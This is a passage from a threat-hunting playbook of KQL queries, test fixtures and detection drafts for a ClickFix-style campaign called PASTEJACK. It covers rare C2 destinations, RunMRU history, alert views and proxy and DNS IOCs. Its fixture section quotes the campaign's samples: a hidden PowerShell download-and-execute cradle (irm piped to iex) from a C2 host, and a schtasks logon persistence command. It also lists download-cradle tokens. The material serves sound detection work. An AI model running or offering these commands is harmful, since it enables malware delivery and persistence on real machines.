| where Devices <= MaxDevicesPerAction
| sort by OneDriveLookalike desc, ActorFromRoaming desc, LogonTrigger desc, Devices asc
| project-reorder NormRun, TaskNames, Schedules, OneDriveLookalike, LogonTrigger, ActorFromRoaming, Devices, DeviceNames, Actors, ActorFolders, Accounts, CommandLines, Timestamp, LastSeen, DeviceId, DeviceName, ReportId
```

Blind spots: `/tr` given as a relative path or through `/xml` (the action is then inside the XML file, not the command line — H6 still sees it); `-tn`-style flags are handled only for `/tn /tr /sc`; API-created tasks.

### H8 — Rare external destinations from processes running in `AppData\Roaming` (Defender XDR)

Quoted opportunity 3: *"Outbound connections from a process in AppData\Roaming to the listed domains/IP"* — the IOC half is H1 (`FromRoaming`); this is the generalisation that survives infrastructure rotation.

```kql
// PASTEJACK H8 - behaviour, two-tier prevalence (tier 3). Ref: report.md 2026-10-20, opportunity 3 generalised beyond the listed hosts.
// DETECTION STRATEGY: a roaming-profile process talks to a public destination that few devices in the fleet contact - candidate C2 for a user-installed implant.
// THE MECHANIC: upd.exe (AppData\Roaming\msbuild) beacons to the C2 over 443 and POSTs stolen credentials.
// THE RESILIENCE: keyed on process location + destination rarity, not on the domains/IP; survives rotation and recompiles. Noisy by construction - hunt only until a baseline exists.
// DATA: DeviceNetworkEvents / ConnectionSuccess - retention assumed 30d - sampled: YES (throttled; short-lived or repeated connections may be collapsed or dropped)
// TP LIKELIHOOD WHEN IT FIRES: low-medium (user-installed software in Roaming reaches rare CDNs and update hosts)   COVERAGE CAVEAT: a C2 behind a shared CDN/cloud front looks popular; beacons slower than the window are invisible
// STEP 1: population scope (Roaming process, public IP)   STEP 2: normalise process folder   STEP 3: destination prevalence with a floor and a population filter   STEP 4: rank; follow up with the beaconing pattern on the survivors
// ANALYST ACTION: start with Devices == 1 and Connections >= MinConnections; look at Processes (expect a folder you do not recognise) and Hashes (XDR option below). Raise MaxDevicesPerDestination to widen, MinConnections to narrow. FP rate label: High.
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;
let MaxDevicesPerDestination = 3;                                               // destinations contacted by more devices are probably shared SaaS/CDN - FP it trades: a wider compromise or a CDN-fronted C2 is hidden
let MinConnections = 3;                                                         // floor: a single connection is browsing/update noise, a beacon repeats
let KnownRoamingProcessFolders = dynamic([]);                                   // normalised lower-case folder fragments reviewed as BTP, e.g. "\\appdata\\roaming\\spotify\\" - key on folder + signer, not file name
DeviceNetworkEvents
| where Timestamp > ago(TimeFrame)
| where ActionType == "ConnectionSuccess"
| where RemoteIPType == "Public"                                                // producer-controlled enum; drops private, loopback and reserved ranges in one indexed predicate
| where InitiatingProcessFolderPath has_all ("AppData", "Roaming")
| extend NormFolder = replace_regex(tolower(InitiatingProcessFolderPath), @'\\users\\[^\\]+\\', @'\\users\\<user>\\')  // lint:ignore W014 - normalisation token, not a placeholder
| where array_length(KnownRoamingProcessFolders) == 0 or not(NormFolder has_any (KnownRoamingProcessFolders))
| extend Destination = iff(isempty(RemoteUrl), RemoteIP, RemoteUrl)
| summarize Devices = dcount(DeviceId), Connections = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            Processes = make_set(NormFolder, 10), ProcessNames = make_set(InitiatingProcessFileName, 10), Hashes = make_set(InitiatingProcessSHA256, 10),
            Accounts = make_set(InitiatingProcessAccountName, 10), DeviceNames = make_set(DeviceName, 10), Ports = make_set(RemotePort, 5),
            (Timestamp, ReportId, DeviceId, DeviceName) = arg_max(Timestamp, ReportId, DeviceId, DeviceName)
    by Destination, RemoteIP
| where Devices <= MaxDevicesPerDestination and Connections >= MinConnections
| sort by Devices asc, Connections desc
| project-reorder Destination, RemoteIP, Ports, Devices, DeviceNames, Connections, FirstSeen, LastSeen, Processes, ProcessNames, Accounts, Hashes, DeviceId, DeviceName, ReportId, Timestamp
// XDR-only follow-up (not Sentinel, not promotable as-is): mv-expand Hashes, top 1000 by Connections asc, extend SHA1 lookup via DeviceProcessEvents, then invoke FileProfile(SHA1, 1000) and keep GlobalPrevalence < 200.
// Beaconing follow-up: for the surviving (Destination, process) pairs run the jitter / aggregated-report pattern from the hunting catalogue (section 4.3 of hunting-patterns).
```

Blind spots: throttled network telemetry; CDN-fronted C2 (popular destination); beacons with a sleep longer than the window; processes that inject into a browser or `svchost` instead of connecting from Roaming; any folder you allow-list (a stealer dropped into `Roaming\Spotify\` would then be invisible — allow-list on folder **and** signer).

### H9 — Run-dialog history (`RunMRU`) containing a shell or download cradle (Defender XDR)

Corroboration for the initial-access mechanic. **Check the preflight first** — `RunMRU` writes are not guaranteed to be in `DeviceRegistryEvents` on every sensor build; a zero here means nothing by itself.

```kql
// PASTEJACK H9 - initial-access corroboration (tier 3). Ref: report.md 2026-10-20, "pasting a command into the Windows Run dialog".
// DETECTION STRATEGY: a user ran a shell or a cradle from Win+R - the ClickFix lure's only user-visible step.
// THE MECHANIC: Explorer stores each Run-dialog command as a value under HKCU\...\Explorer\RunMRU (suffixed "\1"), so the pasted conhost/powershell line survives on disk even if the process tree is gone.
// THE RESILIENCE: catches variants H5 misses (mshta, msiexec, curl, no conhost wrapper) because it keys on what was typed, not on which process ran.
// DATA: DeviceRegistryEvents / RegistryValueSet - retention assumed 30d - sampled: no - coverage of RunMRU varies (preflight)
// TP LIKELIHOOD WHEN IT FIRES: medium (admins type powershell/cmd into Run; a cradle or "headless" in Run is high)   COVERAGE CAVEAT: lures that use the terminal, a File Explorer address bar or a PowerShell window instead of Win+R
// STEP 1: anchor on the key   STEP 2: token match on the value   STEP 3: one row per device + account with the command set
// ANALYST ACTION: Headless or HasFetch == true is an incident; plain "powershell"/"cmd" rows are noise unless the account is non-admin. FP rate label: Low-Medium.
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;
let RunTokens   = dynamic(["conhost", "powershell", "pwsh", "mshta", "msiexec", "curl", "wscript", "cscript", "certutil", "bitsadmin", "rundll32", "regsvr32"]);
let CradleFetch = dynamic(["irm", "iwr", "Invoke-RestMethod", "Invoke-WebRequest", "DownloadString", "DownloadFile", "WebClient", "Start-BitsTransfer", "wget"]);
DeviceRegistryEvents
| where Timestamp > ago(TimeFrame)
| where ActionType == "RegistryValueSet"
| where RegistryKey has "RunMRU"
| where RegistryValueData has_any (RunTokens) or RegistryValueData has_any (CradleFetch)
| extend Headless = RegistryValueData has "headless", HasFetch = RegistryValueData has_any (CradleFetch)
| summarize Commands = make_set(RegistryValueData, 20), Entries = count(), LastSeen = max(Timestamp),
            (Timestamp, ReportId) = arg_max(Timestamp, ReportId)
    by DeviceId, DeviceName, InitiatingProcessAccountName, Headless, HasFetch
| sort by Headless desc, HasFetch desc, LastSeen desc
| project-reorder DeviceName, InitiatingProcessAccountName, Headless, HasFetch, Commands, Entries, Timestamp, LastSeen, DeviceId, ReportId
```

Blind spots: RunMRU not collected; MRU list capacity (26 entries) overwritten by later use; lures that avoid Win+R.

## 6. Vendor-alert view

### H10 — Defender's own alerts touching this campaign (Defender XDR)

```kql
// PASTEJACK H10 - vendor-alert view. Ref: report.md 2026-10-20. Raw telemetry (H1-H9) AND the product's own detections must both be checked.
// DETECTION STRATEGY: surface Defender alerts whose title describes the technique, or whose evidence contains the campaign IOCs / artefacts.
// DATA: AlertInfo + AlertEvidence - retention assumed 30d - sampled: no
// TP LIKELIHOOD WHEN IT FIRES: as per the alert   COVERAGE CAVEAT: alert titles change between product versions; keep the term list loose
// ANALYST ACTION: evidence matches (AlertId in Evidence) are the campaign; title matches are the technique family - triage both. FP rate label: Low.
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;
let AlertTitleTerms = dynamic(["ClickFix", "conhost", "headless", "clipboard", "paste", "Run dialog", "suspicious PowerShell", "scheduled task", "infostealer", "credential theft", "browser credential"]);
let C2Domains = dynamic(["cdn-updates-check.com", "telemetry-sync-cloud.net"]);
let C2IPs     = dynamic(["203.0.113.45"]);
let PayloadSHA256 = dynamic(["9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0"]);
let Evidence = AlertEvidence
| where Timestamp > ago(TimeFrame)
| where RemoteUrl has_any (C2Domains) or RemoteIP in (C2IPs) or SHA256 in~ (PayloadSHA256)
    or ProcessCommandLine has "headless" or FolderPath has_all ("Roaming", "msbuild")
| distinct AlertId;
AlertInfo
| where Timestamp > ago(TimeFrame)
| where Title has_any (AlertTitleTerms) or AlertId in (Evidence)
| extend EvidenceMatch = AlertId in (Evidence)
| join kind=leftouter (
    AlertEvidence
    | where Timestamp > ago(TimeFrame)
    | summarize Devices = make_set(DeviceName, 10), Accounts = make_set(AccountName, 10), Urls = make_set(RemoteUrl, 10), Files = make_set(FileName, 10), CommandLines = make_set(ProcessCommandLine, 5) by AlertId
  ) on AlertId
| project-away AlertId1
| sort by EvidenceMatch desc, Timestamp desc
| project-reorder Timestamp, Title, Severity, Category, DetectionSource, EvidenceMatch, Devices, Accounts, Files, CommandLines, Urls, AlertId
```

## 7. Sentinel-native queries

Every H-query above runs unchanged in Sentinel when the Microsoft Defender XDR connector streams the `Device*` / `Alert*` tables (mirrored tables keep `Timestamp`; `TimeGenerated` is overwritten with ingestion time for data landing > 48 h late, so `Timestamp` is the right column for event-time math there). Raise `TimeFrame` to the table's retention. The three blocks below cover what XDR cannot see: proxy / firewall / DNS logs and the Sentinel alert table.

### S1 — Proxy / firewall logs: C2 hosts, IP, exfil user agent (Sentinel)

```kql
// PASTEJACK S1 - network IOC + exfil artefact in CEF/proxy logs. Ref: report.md 2026-10-20, C2 and exfiltration paragraphs.
// DETECTION STRATEGY: egress devices saw the C2 hosts/IP, or a TLS-terminating proxy saw the stealer user agent - covers what MDE's throttled network log misses, including the HTTPS POST's headers.
// DATA: CommonSecurityLog (any CEF proxy/firewall) - retention assumed 90d - sampled: no
// TP LIKELIHOOD WHEN IT FIRES: high   COVERAGE CAVEAT: field population differs per vendor (RequestURL vs DestinationHostName vs DestinationDnsDomain); check which your products fill
// ANALYST ACTION: SourceIP / SourceUserName -> device; pivot to H4/H5 by DeviceName. FP rate label: Low.
// UNTESTED - derived from report, no sample run
let TimeFrame = 90d;
let C2Domains = dynamic(["cdn-updates-check.com", "telemetry-sync-cloud.net"]);
let C2IPs     = dynamic(["203.0.113.45"]);
let ExfilUserAgent = "UpdateChecker";
CommonSecurityLog
| where TimeGenerated > ago(TimeFrame)
| where DestinationIP in (C2IPs)
    or DestinationHostName has_any (C2Domains)
    or DestinationDnsDomain has_any (C2Domains)
    or RequestURL has_any (C2Domains)
    or RequestClientApplication has (ExfilUserAgent)
| extend UserAgentMatch = RequestClientApplication has (ExfilUserAgent)
| summarize Events = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            Sources = make_set(SourceIP, 20), Users = make_set(SourceUserName, 20), Urls = make_set(RequestURL, 10),
            Methods = make_set(RequestMethod, 5), Actions = make_set(DeviceAction, 5), UserAgentMatch = max(UserAgentMatch)
    by DeviceVendor, DeviceProduct, DestinationIP, DestinationHostName
| sort by UserAgentMatch desc, Events desc
```

Optional DNS branch when the ASIM DNS parsers are deployed (one block, same IOC list):

```kql
// PASTEJACK S1b - DNS resolution of the C2 domains through ASIM (Sentinel). Ref: report.md 2026-10-20.
// UNTESTED - derived from report, no sample run
let TimeFrame = 90d;
let C2Domains = dynamic(["cdn-updates-check.com", "telemetry-sync-cloud.net"]);
_Im_Dns(starttime = ago(TimeFrame), domain_has_any = C2Domains)
| summarize Queries = count(), Clients = make_set(SrcIpAddr, 20), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
    by DnsQuery, DnsResponseName, EventVendor, EventProduct
| sort by Queries desc
```

### S2 — Sentinel alert table (Sentinel)

```kql
// PASTEJACK S2 - vendor-alert view in Sentinel. Ref: report.md 2026-10-20. Mirrors H10 for alerts from every connected provider (MDE, MDO, MDI, MDCA, third parties).
// DATA: SecurityAlert (append-only: every update is a new row, collapse by SystemAlertId) - retention assumed 90d
// ANALYST ACTION: entity matches are the campaign; name matches are the technique family. FP rate label: Low.
// UNTESTED - derived from report, no sample run
let TimeFrame = 90d;
let AlertTitleTerms = dynamic(["ClickFix", "conhost", "headless", "clipboard", "paste", "Run dialog", "suspicious PowerShell", "scheduled task", "infostealer", "credential theft", "browser credential"]);
let C2Domains = dynamic(["cdn-updates-check.com", "telemetry-sync-cloud.net"]);
let C2IPs     = dynamic(["203.0.113.45"]);
let PayloadSHA256 = dynamic(["9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0"]);
SecurityAlert
| where TimeGenerated > ago(TimeFrame)
| where AlertName has_any (AlertTitleTerms)
    or Entities has_any (C2Domains) or Entities has_any (C2IPs) or Entities has_any (PayloadSHA256)
    or ExtendedProperties has "headless"
| summarize arg_max(TimeGenerated, *) by SystemAlertId                          // latest version of each alert
| extend EntityMatch = Entities has_any (C2Domains) or Entities has_any (C2IPs) or Entities has_any (PayloadSHA256)
| project TimeGenerated, AlertName, AlertSeverity, ProviderName, ProductName, CompromisedEntity, EntityMatch, Tactics, Techniques, SystemAlertId
| sort by EntityMatch desc, TimeGenerated desc
```

### S3 — Threat-intelligence seeding (no query to run; a decision)

The IOCs (two domains, one IP, one hash) belong in the indicator stores, not in a scheduled KQL rule: Defender XDR **Indicators** (alert + block, applies to every onboarded device with network protection) and Sentinel `ThreatIntelIndicators` (upload API / Defender TI connector) so the built-in TI analytics rules match proxy/DNS/firewall logs automatically. Default TI rules only match events ingested **after** the indicator arrives — run H1 and S1 once for the retro look-back, then let the indicator store own the IOCs. Treat the indicator feed as match-only data; never let it drive exclusions.

## 8. TP fixtures — the report's own samples

Both samples are stored defanged here and refanged in the fixtures (a query that cannot match its own evidence is the most common report-derived bug).

Sample 1 (Run dialog, opportunity 1):

    conhost.exe --headless powershell.exe -w hidden -c "irm hxxps://cdn-updates-check[.]com/v.txt | iex"

Sample 2 (persistence, opportunity 2):

    schtasks /create /sc ONLOGON /tn "OneDrive Sync Health" /tr "C:\Users\<user>\AppData\Roaming\msbuild\upd.exe" /f

Run each fixture today without any tenant data: paste the fixture's `let` block **above** the target query's own `let` lines. The `let` shadows the real table, so the unchanged query runs against the three rows. Fixture timestamps are 2026-10-20; bump them (or widen `TimeFrame`) once they age past the window.

### Fixture F1 for H5 and D1 (Defender XDR fixture)

```kql
// Fixture F1 - datatable substitution for DeviceProcessEvents. Expected: exactly one row (dev-tp, Score 3: fetch + exec + hidden). Rows 2 and 3 must NOT appear.
let DeviceProcessEvents = datatable(Timestamp:datetime, ReportId:long, DeviceId:string, DeviceName:string, AccountName:string, AccountSid:string, ActionType:string, FileName:string, FolderPath:string, SHA256:string, ProcessId:long, ProcessCommandLine:string, InitiatingProcessId:long, InitiatingProcessFileName:string, InitiatingProcessCommandLine:string, InitiatingProcessParentFileName:string)
[
  // TP - sample 1 refanged (expected: fires)
  datetime(2026-10-20 09:15:00), 1001, "dev-tp", "WS-TP-01", "jdoe", "S-1-5-21-1-1-1-1001", "ProcessCreated", "powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\", "", 4120, @"powershell.exe -w hidden -c ""irm https://cdn-updates-check.com/v.txt | iex""", 4100, "conhost.exe", @"conhost.exe --headless powershell.exe -w hidden -c ""irm https://cdn-updates-check.com/v.txt | iex""", "explorer.exe",
  // Benign lookalike - headless conhost running a local script, no cradle (expected: no row)
  datetime(2026-10-20 10:00:00), 1002, "dev-benign", "WS-BENIGN-01", "svc-build", "S-1-5-21-1-1-1-1002", "ProcessCreated", "powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\", "", 5120, @"powershell.exe -NoProfile -File C:\Scripts\nightly-backup.ps1", 5100, "conhost.exe", @"conhost.exe --headless powershell.exe -NoProfile -File C:\Scripts\nightly-backup.ps1", "cmd.exe",
  // Coverage caveat - same cradle without the conhost wrapper (expected: no row in H5/D1; this is the documented blind spot - widen by dropping the two InitiatingProcess* filters)
  datetime(2026-10-20 11:30:00), 1003, "dev-gap", "WS-GAP-01", "asmith", "S-1-5-21-1-1-1-1003", "ProcessCreated", "powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\", "", 6120, @"powershell.exe -w hidden -c ""irm https://cdn-updates-check.com/v.txt | iex""", 6100, "explorer.exe", @"C:\Windows\Explorer.EXE", "userinit.exe"
];
// ... paste H5 (or D1) here, from its first `let` line onward
```

### Fixture F2 for H7 (Defender XDR fixture)

```kql
// Fixture F2 - datatable substitution for DeviceProcessEvents. Expected: exactly one NormRun row (\users\<user>\appdata\roaming\msbuild\upd.exe) with OneDriveLookalike, LogonTrigger and ActorFromRoaming all true. Row 2 must NOT appear.
let DeviceProcessEvents = datatable(Timestamp:datetime, ReportId:long, DeviceId:string, DeviceName:string, AccountName:string, ActionType:string, FileName:string, ProcessCommandLine:string, InitiatingProcessFileName:string, InitiatingProcessFolderPath:string, InitiatingProcessCommandLine:string)
[
  // TP - sample 2 with a concrete user (expected: fires)
  datetime(2026-10-20 09:16:00), 2001, "dev-tp", "WS-TP-01", "jdoe", "ProcessCreated", "schtasks.exe", @"schtasks /create /sc ONLOGON /tn ""OneDrive Sync Health"" /tr ""C:\Users\jdoe\AppData\Roaming\msbuild\upd.exe"" /f", "upd.exe", @"c:\users\jdoe\appdata\roaming\msbuild\", @"C:\Users\jdoe\AppData\Roaming\msbuild\upd.exe",
  // Benign lookalike - installer registers a task under Program Files (expected: no row)
  datetime(2026-10-20 12:00:00), 2002, "dev-benign", "WS-BENIGN-01", "jdoe", "ProcessCreated", "schtasks.exe", @"schtasks /create /sc DAILY /tn ""Vendor Agent Update"" /tr ""C:\Program Files\Vendor\agent.exe --update"" /f", "setup.exe", @"c:\users\jdoe\downloads\", @"C:\Users\jdoe\Downloads\setup.exe"
];
// ... paste H7 here, from its first `let` line onward
```

## 9. Which of these could become detections — and how

Rule of thumb from the skill: the same query is a hunt when `query_frequency == query_period` and a detection when `query_frequency < query_period`. Promotion means fixing the windows, replacing ranking with floored thresholds, collapsing per entity, externalising allow-lists, documenting the dedup key and the blind spots, and rewriting the description. IOC queries are **not** promoted into KQL rules; they go to the indicator stores (S3).

| Query | Promote? | Where / schedule | Collapse entity · dedup key | What must change first | Blind spots to write into the spec |
|---|---|---|---|---|---|
| H1 network IOC | No — indicator store | XDR Indicators (alert+block), Sentinel TI | — | retro look-back once (H1/S1), then let TI rules own it | rotated infra |
| H2 user agent / URI | Maybe (Sentinel proxy side) | Sentinel scheduled on `CommonSecurityLog`, 1h / 1h15m with `query_wait` 15m; XDR side stays a hunt (sampled Zeek) | SourceIP + SourceUserName · grouping on SourceIP | confirm the proxy terminates TLS; `RequestClientApplication has "UpdateChecker"` only | TLS, sampling |
| H3 hash | No — indicator store | XDR Indicators (file hash) | — | — | rebuilds |
| H4 drop-folder path | Yes, narrow form | XDR custom detection 1h / 4h on `DeviceFileEvents` + `DeviceProcessEvents` | DeviceId · `DedupFields: DeviceId, NormPath` | keep `msbuild` token, remove the prevalence stage (XDR 4h lookback is too short for prevalence), add `(Timestamp, ReportId)=arg_min` | different folder name, `AppData\Local` |
| **H5 headless conhost cradle** | **Yes, strongest candidate** | XDR custom detection **1h / 4h**; NRT-eligible (single table, no join) once comments are stripped; Sentinel: PT1H / PT4H scheduled with `query_wait` 15m | DeviceId + AccountSid · `DedupFields: DeviceId, AccountSid, InitiatingProcessId` | windows (`ingestion_time()`), per-entity collapse, allow-list fence — done in D1 below | explorer -> powershell without conhost; mshta/msiexec/curl cradles; `-File` of a dropped script |
| H6 task -> Roaming | Yes, after tuning | XDR 24h / 30d with a `Timestamp between (ago(30d) .. ago(1d))` baseline of known `NormAction` values, or Sentinel 1h / 14d with a summary-rule baseline (90 d) and a watchlist `PASTEJACK_RoamingTaskAllow` keyed on NormAction + signer | DeviceId · `DedupFields: DeviceId, NormAction` | two weeks of hunt output to seed the allow-list; first-run noise burst (30 d scan) expected | `AppData\Local`, API-created tasks if `ScheduledTaskCreated` is absent, every path you allow-list |
| H7 schtasks -> Roaming | Yes, as H6's companion or merged (union) | same as H6 | DeviceId · `DedupFields: DeviceId, NormRun` | same as H6 | `/xml`-defined tasks, API-created tasks |
| H8 rare destination from Roaming | Not yet — hunt only | re-evaluate after 30 d of hunt output; promotion needs a persisted destination baseline (summary rule) and the beaconing pattern on top | DeviceId · `DedupFields: DeviceId, Destination` | baseline + beacon scoring + watchlist of roaming vendors | CDN-fronted C2, throttling, long sleeps |
| H9 RunMRU | Maybe | XDR 1h / 4h single-table on `DeviceRegistryEvents` **only** if the preflight shows RunMRU coverage; `Headless or HasFetch` as the predicate | DeviceId + account · `DedupFields: DeviceId, InitiatingProcessAccountName` | preflight evidence; drop the plain-shell tokens | lures that avoid Win+R |
| H10 / S2 alerts | No (they already are detections) | — | — | — | — |

### D1 — Promotion-ready draft of H5 (Defender XDR custom detection draft — not a hunt)

Differences from H5: no `Timestamp > ago()` on the recent window (the service evaluates the lookback on `ingestion_time()`; a self-inflicted `Timestamp` filter drops late-arriving events), per-entity collapse with the required columns recovered, a fenced tuning region, ranking replaced by a hard predicate, dedup key documented. Expected volume: far below the 150/run cap (near zero in a healthy estate). Resource indicator expected Low (single table, enum + FileName pre-filters before any `extend`). First run scans 30 d — review that burst before enabling any response action; no response action is wired until a measured TP rate exists.

```kql
// [ORG] ClickFix: headless conhost launches PowerShell download cradle - v0.1 DRAFT. Ref: PASTEJACK advisory excerpt 2026-10-20 (report.md), opportunity 1.
// Identifies powershell.exe/pwsh.exe started by conhost.exe --headless whose command line (or decoded -EncodedCommand) contains a download verb; within the last 4h, one alert per device + account + launching conhost.
// MITRE: T1059.001, T1105, T1564.003 (context T1204.004). Severity: High. Impacted assets: Device (DeviceId), Account (AccountSid). Related evidence: Process (CommandLines).
// Frequency 1h / lookback 4h (fixed XDR pair). Single table, no join/union/externaldata: NRT-eligible once every comment line is removed.
// DedupFields: DeviceId, AccountSid, InitiatingProcessId - re-validate when the projection changes.
// Blind spots: explorer -> powershell without the conhost wrapper; mshta/msiexec/curl cradles; -File of an already-dropped script; verbs outside CradleFetch. Unit fixture: F1 (section 8).
// Status: derived from report, UNTESTED - lint clean, no sample run.
let CradleFetch = dynamic(["irm", "iwr", "Invoke-RestMethod", "Invoke-WebRequest", "DownloadString", "DownloadFile", "DownloadData", "WebClient", "WebRequest", "Start-BitsTransfer", "curl", "wget"]); // download verbs; the 3-char aliases are exact terms on a FileName-anchored set
let ShellNames  = dynamic(["powershell.exe", "pwsh.exe", "powershell_ise.exe"]);
// Begin environment-specific filter.
let ExcludedAccountSids = dynamic([]);   // OPTION: SIDs of approved automation that legitimately launches conhost --headless + a download verb. None expected. Excluding an account means a ClickFix run under that account will not fire.
// End environment-specific filter.
DeviceProcessEvents
| where ingestion_time() > ago(4h)                                              // matches the lookback for cost only; the platform owns the window
| where ActionType == "ProcessCreated"
| where FileName in~ (ShellNames)
| where InitiatingProcessFileName =~ "conhost.exe"
| where InitiatingProcessCommandLine has "headless"
| extend Canon = replace_string(ProcessCommandLine, '"', '')
| extend IsEncoded = Canon contains "-enc" or Canon has "EncodedCommand"
| extend Encoded = extract(@'\s+([A-Za-z0-9+/]{20}\S+$)', 1, Canon)
| extend Decoded = iff(IsEncoded and isnotempty(Encoded), replace_string(base64_decode_tostring(Encoded), "\u0000", ""), "")
| where Canon has_any (CradleFetch) or Decoded has_any (CradleFetch) or IsEncoded
| where array_length(ExcludedAccountSids) == 0 or AccountSid !in (ExcludedAccountSids)
| summarize (Timestamp, ReportId) = arg_min(Timestamp, ReportId), Events = count(),
            CommandLines = make_set(ProcessCommandLine, 10), DecodedCommands = make_set(Decoded, 5), Parents = make_set(InitiatingProcessParentFileName, 5)
    by DeviceId, DeviceName, AccountSid, AccountName, InitiatingProcessId
| project Timestamp, ReportId, DeviceId, DeviceName, AccountSid, AccountName, InitiatingProcessId, Events, CommandLines, DecodedCommands, Parents
```

Sentinel scheduled variant of D1: same body with `let query_frequency = 1h; let query_period = 4h; let query_wait = 15m;` and `| where ingestion_time() between (ago(query_frequency + query_wait) .. ago(query_wait))` in place of the `ingestion_time() > ago(4h)` line; entity mappings `Host: HostName = DeviceName`, `Account: Sid = AccountSid`; grouping by Host, suppression 4h. Hunt YAML for H1–H10 carries **no** `severity`, `queryFrequency`, `queryPeriod`, `triggerOperator` or `kind` fields.

## 10. Before you trust the results

- Preflight (§2) first: three queries depend on sub-event types that may not exist in this tenant.
- Expected hit counts on a clean estate: H1/H2/H3 = 0; H5 = 0; H4 narrow = 0, widened = tens; H6/H7 = a handful of vendor tasks (seed the allow-list from them); H8 = tens to hundreds (hunt only); H9 = depends on RunMRU coverage; H10/S2 = whatever Defender already raised.
- Every exclusion you add while tuning gets a blind-spot line ("excluding X means attack Y via X will not fire") and goes into a rule-scoped, expiring watchlist — never a copy-pasted literal across H6/H7/H8.
- Re-run fixtures F1/F2 after any edit: the TP row must still fire.
